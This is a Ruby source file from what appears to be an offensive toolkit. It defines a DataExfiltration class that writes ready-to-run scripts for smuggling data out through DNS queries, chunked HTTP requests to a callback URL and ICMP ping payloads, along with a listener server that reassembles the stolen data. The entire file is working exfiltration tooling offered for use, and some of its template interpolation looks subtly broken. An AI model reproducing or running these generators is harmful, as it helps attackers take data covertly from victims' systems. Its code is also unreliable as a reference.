require 'net/http'
require 'uri'
require 'base64'
require 'zlib'
require_relative '../utils/colorize'

class DataExfiltration
  def self.exfiltrate_via_dns(target_data, dns_server)
    chunks = target_data.bytes.each_slice(60).map { |chunk| Base64.strict_encode64(chunk.pack('C*')) }
    
    script = <<~RUBY
      require 'resolv'
      
      data = '#{target_data}'
      dns_server = '#{dns_server}'
      chunks = data.bytes.each_slice(60).map { |chunk| Base64.strict_encode64(chunk.pack('C*')) }
      
      chunks.each_with_index do |chunk, i|
        domain = "#{chunk}.exfil.#{dns_server}"
        Resolv::DNS.open do |dns|
          dns.getresources(domain, Resolv::DNS::Resource::IN::A)
        end
        sleep(0.1)
      end
    RUBY
    
    filename = "dns_exfil_#{Time.now.to_i}.rb"
    File.write(filename, script)
    puts Colorize.green("DNS exfiltration script saved: #{filename}")
    filename
  end

  def self.exfiltrate_via_http(target_data, callback_url)
    script = <<~RUBY
      require 'net/http'
      require 'uri'
      require 'base64'
      require 'zlib'
      
      data = '#{target_data}'
      callback = '#{callback_url}'
      
      compressed = Zlib::Deflate.deflate(data)
      encoded = Base64.strict_encode64(compressed)
      
      chunks = encoded.chars.each_slice(1000).map(&:join)
      
      chunks.each_with_index do |chunk, i|
        uri = URI("#{callback_url}?chunk=#{i}&data=#{URI.encode_www_form_component(chunk)}")
        Net::HTTP.get_response(uri)
        sleep(0.5)
      end
    RUBY
    
    filename = "http_exfil_#{Time.now.to_i}.rb"
    File.write(filename, script)
    puts Colorize.green("HTTP exfiltration script saved: #{filename}")
    filename
  end

  def self.exfiltrate_via_icmp(target_data, target_ip)
    script = <<~SH
      #!/bin/bash
      
      data='#{target_data}'
      target='#{target_ip}'
      
      echo "$data" | base64 | while read chunk; do
        ping -c 1 -p "$chunk" "$target"
        sleep 0.5
      done
    SH
    
    filename = "icmp_exfil_#{Time.now.to_i}.sh"
    File.write(filename, script)
    File.chmod(filename, 0755)
    puts Colorize.green("ICMP exfiltration script saved: #{filename}")
    filename
  end

  def self.generate_exfiltration_server(port = 8080)
    server = <<~RUBY
      require 'webrick'
      require 'base64'
      require 'zlib'
      
      port = #{port}
      chunks = {}
      
      server = WEBrick::HTTPServer.new(:Port => port)
      
      server.mount_proc '/' do |req, res|
        if req.query['chunk'] && req.query['data']
          chunk_num = req.query['chunk'].to_i
          chunks[chunk_num] = req.query['data']
          
          puts "Received chunk #{chunk_num}"
          
          if chunks.keys.length == chunks.keys.max + 1
            puts "All chunks received, reconstructing..."
            data = chunks.sort.map { |k, v| v }.join
            decoded = Base64.strict_decode64(data)
            decompressed = Zlib::Inflate.inflate(decoded)
            
            File.write("exfiltrated_data_#{Time.now.to_i}.bin", decompressed)
            puts "Data saved to exfiltrated_data_#{Time.now.to_i}.bin"
          end
          
          res.status = 200
          res.body = 'OK'
        else
          res.status = 200
          res.body = 'Exfiltration server active'
        end
      end
      
      trap('INT') { server.shutdown }
      server.start
    RUBY
    
    filename = "exfil_server_#{Time.now.to_i}.rb"
    File.write(filename, server)
    puts Colorize.green("Exfiltration server saved: #{filename}")
    filename
  end
end

